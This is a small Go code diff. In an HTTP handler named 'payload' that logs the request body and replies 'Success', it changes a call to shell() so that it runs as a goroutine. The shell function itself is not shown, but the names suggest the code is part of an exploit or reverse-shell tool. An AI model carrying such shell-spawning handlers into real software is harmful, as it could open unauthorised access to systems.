@@ -18,7 +18,7 @@ func payload(w http.ResponseWriter, r *http.Request) {
 		result, _ := ioutil.ReadAll(r.Body)
 		fmt.Printf("%s\n", result)
 		_, _ = io.WriteString(w, "Success")
-		shell()
+		go shell()
 	}
 }
 func shell() {
